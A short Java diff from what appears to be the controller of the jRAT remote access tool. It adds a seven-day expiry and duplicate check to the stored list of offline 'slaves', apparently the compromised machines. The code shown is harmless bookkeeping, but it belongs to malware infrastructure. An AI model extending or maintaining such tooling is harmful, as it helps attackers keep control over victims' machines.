@@ -16,8 +16,8 @@ import se.jrat.client.OfflineSlave;
 public class OfflineSlaves extends AbstractSettings {
 	
 	private static final List<OfflineSlave> LIST = new ArrayList<OfflineSlave>();
-	
 	private static final OfflineSlaves INSTANCE = new OfflineSlaves();
+	private static final long TTL = 1000L * 60L * 60L * 24L * 7L;
 	
 	public static OfflineSlaves getGlobal() {
 		return INSTANCE;
@@ -48,7 +48,13 @@ public class OfflineSlaves extends AbstractSettings {
 		String line;
 		
 		while ((line = reader.readLine()) != null) {
-			LIST.add(OfflineSlave.fromString(line));
+			OfflineSlave os = OfflineSlave.fromString(line);
+			
+			if (System.currentTimeMillis() - os.getCreation() > TTL) {
+				continue;
+			}
+			
+			LIST.add(os);
 		}
 		
 		reader.close();
@@ -57,6 +63,16 @@ public class OfflineSlaves extends AbstractSettings {
 	@Override
 	public File getFile() {
 		return new File(Globals.getSettingsDirectory(), ".offline");
+	}
+
+	public void add(OfflineSlave offlineSlave) {
+		for (OfflineSlave os : getList()) {
+			if (os.equals(offlineSlave)) {
+				return;
+			}
+		}
+		
+		LIST.add(offlineSlave);
 	}
 
 }
